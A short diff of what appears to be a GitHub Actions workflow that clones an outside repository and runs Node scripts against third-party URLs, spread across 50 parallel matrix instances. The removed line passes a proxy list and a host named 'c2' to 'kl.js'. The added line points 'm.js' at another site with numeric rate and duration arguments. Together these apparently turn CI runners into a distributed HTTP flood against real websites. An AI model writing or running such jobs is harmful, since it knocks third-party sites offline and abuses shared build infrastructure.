@@ -42,7 +42,7 @@ jobs:
         run: |
           git clone https://github.com/vrbrh921-glitch/Fc.git
           cd Fc
-          node kl.js GET https://c2.dstatbot.win/IhePql4L 650 4 120 proxy.txt --debug  --full
+          node m.js https://investorbit.live/FJ4jyqsf 200 3 3 3
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 50
